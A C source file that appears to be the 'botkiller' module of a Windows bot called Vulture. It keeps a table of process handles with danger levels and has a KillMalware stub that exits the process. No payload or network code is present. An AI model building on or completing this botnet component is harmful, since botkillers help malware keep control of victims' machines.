#include "botkiller.h"

#ifdef MODULE_BOTKILLER
#include "mem.h"
#include "pipes.h"
#include "ipc.h"

extern bot_t bot;

static botkill_process_t* pBotkillProcesses = NULL;
static DWORD dwBotkillProcessCount = 0;

void WINAPI InitBotkiller(void)
{
	pBotkillProcesses = NULL;
	dwBotkillProcessCount = 0;
}

void WINAPI AddBotkillHandle(HANDLE hProcess)
{
	botkill_process_t* pNewProcess = NULL;
	DWORD dwIndex = 0;
	unsigned int i;

	for (i = 0; i < dwBotkillProcessCount; i++)
	{
		if (pBotkillProcesses[i].hProcess == INVALID_HANDLE_VALUE)
		{
			pNewProcess = &pBotkillProcesses[i];
			dwIndex = i;
			break;
		}
	}

	if (pNewProcess == NULL && memreallocEx(&pBotkillProcesses, sizeof(botkill_process_t) * (dwBotkillProcessCount + 1)))
	{
		dwIndex = dwBotkillProcessCount++;
		pNewProcess = &pBotkillProcesses[dwIndex];
	}

	if (pNewProcess != NULL)
	{
		pNewProcess->hProcess = hProcess;
		pNewProcess->iDangerLevel = 0;
	}
}

static DWORD _FindProcess(HANDLE hProcess)
{
	unsigned int i;

	for (i = 0; i < dwBotkillProcessCount; i++)
	{
		if (pBotkillProcesses[i].hProcess == hProcess)
			return i;
	}

	return -1;
}

void WINAPI RemoveBotkillHandle(HANDLE hProcess)
{
	DWORD dwIndex, dwNewCount;
	botkill_process_t* pProcess;

	if ((dwIndex = _FindProcess(hProcess)) == -1)
		return;

	pProcess = &pBotkillProcesses[dwIndex];
	pProcess->hProcess = INVALID_HANDLE_VALUE;
	pProcess->iDangerLevel = 0;

	dwNewCount = dwBotkillProcessCount;

	while (dwNewCount > 0 && pBotkillProcesses[dwNewCount - 1].hProcess == INVALID_HANDLE_VALUE) dwNewCount--;

	if (dwNewCount != dwBotkillProcessCount)
	{
		if (dwNewCount == 0)
		{
			memfree(pBotkillProcesses);
			pBotkillProcesses = NULL;
		}
		else memreallocEx(&pBotkillProcesses, sizeof(botkill_process_t) * dwNewCount);

		dwBotkillProcessCount = dwNewCount;
	}
}

/*
	Kills process after telling main Vulture process to remove file as it is deemed malicious
*/
void WINAPI KillMalware(void)
{
	bot.api.pExitProcess(0);
}
#endif